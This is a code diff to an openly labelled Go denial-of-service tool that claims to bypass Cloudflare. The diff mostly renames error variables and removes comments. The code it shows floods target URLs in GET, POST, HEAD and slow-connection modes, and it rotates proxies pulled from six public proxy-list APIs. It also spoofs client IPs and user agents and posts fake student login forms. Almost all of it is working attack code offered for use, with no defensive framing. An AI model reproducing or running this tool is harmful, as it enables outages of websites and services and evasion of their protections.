@@ -3,7 +3,7 @@
 # ----------------------------------------
 # ADVANCED GO DOS TOOL - CLOUDFLARE BYPASS PRO
 # MULTI-TARGET + HTTP/2 + HTTP/1.1 + Advanced Spoofing
-# WITH 6 PROXY API SOURCES - FULLY FIXED
+# WITH 6 PROXY API SOURCES - FINAL FIXED VERSION
 # ----------------------------------------
 
 # Color definitions
@@ -61,31 +61,23 @@ import (
 var (
 	// Extended user agents with more diversity
 	userAgents = []string{
-		// Windows Chrome
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
-		// macOS Chrome
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
-		// Linux Chrome
 		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
 		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
-		// Firefox variants
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
 		"Mozilla/5.0 (X11; Linux i686; rv:135.0) Gecko/20100101 Firefox/135.0",
-		// Mobile
 		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
 		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
 		"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Mobile Safari/537.36",
-		// Edge
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36 Edg/141.0.0.0",
-		// Opera
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36 OPR/141.0.0.0",
 	}
 
-	// Extended referers
 	referers = []string{
 		"https://www.google.com/",
 		"https://www.bing.com/",
@@ -160,7 +152,6 @@ var (
 	proxyMu         sync.RWMutex
 	proxyIndex      uint64
 	
-	// 6 Different Proxy API Sources
 	proxyAPIs = []string{
 		"https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
 		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
@@ -329,8 +320,8 @@ func (p *ConnectionPool) createClient() *http.Client {
 			if !strings.Contains(proxyStr, "://") {
 				proxyStr = "http://" + proxyStr
 			}
-			proxyURL, err := url.Parse(proxyStr)
-			if err == nil {
+			proxyURL, parseErr := url.Parse(proxyStr)
+			if parseErr == nil {
 				transport = &http.Transport{
 					Proxy:               http.ProxyURL(proxyURL),
 					TLSClientConfig:     getRandomizedTLSConfig(),
@@ -375,20 +366,19 @@ func (p *ConnectionPool) CloseIdleConnections() {
 	}
 }
 
-// Load proxies from multiple APIs with fallback
 func loadProxiesFromAPI() {
 	var allProxies []string
 	
 	for apiIndex, apiURL := range proxyAPIs {
 		client := &http.Client{Timeout: 15 * time.Second}
-		resp, err := client.Get(apiURL)
-		if err != nil {
+		resp, getErr := client.Get(apiURL)
+		if getErr != nil {
 			continue
 		}
 		
-		body, err := io.ReadAll(resp.Body)
+		body, readErr := io.ReadAll(resp.Body)
 		resp.Body.Close()
-		if err != nil {
+		if readErr != nil {
 			continue
 		}
 		
@@ -398,11 +388,9 @@ func loadProxiesFromAPI() {
 		
 		for _, line := range lines {
 			line = strings.TrimSpace(line)
-			// Validate proxy format (IP:PORT)
 			if line != "" && !strings.HasPrefix(line, "#") && strings.Contains(line, ":") {
 				parts := strings.Split(line, ":")
 				if len(parts) == 2 {
-					// Basic IP validation
 					ipParts := strings.Split(parts[0], ".")
 					if len(ipParts) == 4 {
 						allProxies = append(allProxies, line)
@@ -417,7 +405,6 @@ func loadProxiesFromAPI() {
 		}
 	}
 	
-	// Remove duplicates
 	uniqueProxies := make(map[string]bool)
 	var uniqueList []string
 	for _, proxy := range allProxies {
@@ -439,9 +426,7 @@ func loadProxiesFromAPI() {
 }
 
 func proxyRefresher() {
-	// Initial delay
 	time.Sleep(30 * time.Second)
-	
 	ticker := time.NewTicker(refreshInterval)
 	defer ticker.Stop()
 	
@@ -545,7 +530,6 @@ func generateCookies() []*http.Cookie {
 	return cookies
 }
 
-// Enhanced Cloudflare bypass headers
 func addCloudflareBypassHeaders(req *http.Request) {
 	spoofIP := randomIP()
 	spoofIPv6 := randomIPv6()
@@ -634,9 +618,6 @@ func attackTarget(target Target, workerID int, wg *sync.WaitGroup) {
 				fullURL += path
 			}
 
-			var req *http.Request
-			var err error
-
 			if target.Mode == "SLOW" {
 				u, _ := url.Parse(target.URL)
 				host := u.Hostname()
@@ -644,8 +625,8 @@ func attackTarget(target Target, workerID int, wg *sync.WaitGroup) {
 				if u.Scheme == "https" {
 					port = "443"
 				}
-				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
-				if err != nil {
+				conn, dialErr := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
+				if dialErr != nil {
 					time.Sleep(200 * time.Millisecond)
 					continue
 				}
@@ -657,22 +638,25 @@ func attackTarget(target Target, workerID int, wg *sync.WaitGroup) {
 				continue
 			}
 
+			var req *http.Request
+			var reqErr error
+
 			if target.Mode == "GET" {
-				req, err = http.NewRequest("GET", fullURL, nil)
+				req, reqErr = http.NewRequest("GET", fullURL, nil)
 			} else if target.Mode == "POST" {
 				payload := fmt.Sprintf("student_id=%s&password=%s&email=%s@example.com&csrf=%s", 
 					generateStudentNumber(), randomString(randInt(8, 16)), randomString(10), randomString(20))
-				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
-				if err == nil {
+				req, reqErr = http.NewRequest("POST", fullURL, strings.NewReader(payload))
+				if reqErr == nil {
 					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 				}
 			} else if target.Mode == "HEAD" {
-				req, err = http.NewRequest("HEAD", fullURL, nil)
+				req, reqErr = http.NewRequest("HEAD", fullURL, nil)
 			} else {
 				continue
 			}
 
-			if err != nil {
+			if reqErr != nil {
 				continue
 			}
 
@@ -691,8 +675,8 @@ func attackTarget(target Target, workerID int, wg *sync.WaitGroup) {
 				time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
 			}
 
-			resp, err := client.Do(req)
-			if err == nil {
+			resp, doErr := client.Do(req)
+			if doErr == nil {
 				if target.Mode != "HEAD" {
 					io.Copy(io.Discard, resp.Body)
 				}
@@ -704,9 +688,9 @@ func attackTarget(target Target, workerID int, wg *sync.WaitGroup) {
 }
 
 func loadTargetsFromFile(filename string) ([]TargetConfig, error) {
-	file, err := os.Open(filename)
-	if err != nil {
-		return nil, err
+	file, fileErr := os.Open(filename)
+	if fileErr != nil {
+		return nil, fileErr
 	}
 	defer file.Close()
 
@@ -719,7 +703,6 @@ func loadTargetsFromFile(filename string) ([]TargetConfig, error) {
 			continue
 		}
 		
-		// Format: URL|MODE|DURATION|PROXY
 		parts := strings.Split(line, "|")
 		if len(parts) >= 3 {
 			target := TargetConfig{
@@ -787,14 +770,14 @@ func main() {
 	}
 	
 	var targets []TargetConfig
-	var err error
 	
 	// Check if argument is a file
-	if _, err := os.Stat(os.Args[1]); err == nil {
+	if _, statErr := os.Stat(os.Args[1]); statErr == nil {
 		// File exists - multi-target mode
-		targets, err = loadTargetsFromFile(os.Args[1])
-		if err != nil {
-			fmt.Printf("Error loading targets: %v\n", err)
+		var loadErr error
+		targets, loadErr = loadTargetsFromFile(os.Args[1])
+		if loadErr != nil {
+			fmt.Printf("Error loading targets: %v\n", loadErr)
 			os.Exit(1)
 		}
 		if len(targets) == 0 {
@@ -935,7 +918,7 @@ func main() {
 			close(globalDone)
 		case <-ticker.C:
 			elapsed := time.Since(startTime).Seconds()
-			fmt.Printf("\033[H\033[2J") // Clear screen
+			fmt.Printf("\033[H\033[2J")
 			printBanner()
 			fmt.Println("\n📊 Live Statistics:")
 			fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
@@ -953,7 +936,6 @@ func main() {
 			fmt.Printf("Total Requests: %d | Elapsed: %.0fs | Global RPS: %.0f\n", 
 				totalReqs, elapsed, float64(totalReqs)/elapsed)
 			
-			// Show proxy stats if enabled
 			if useProxyAny {
 				proxyMu.RLock()
 				proxyCount := len(proxies)
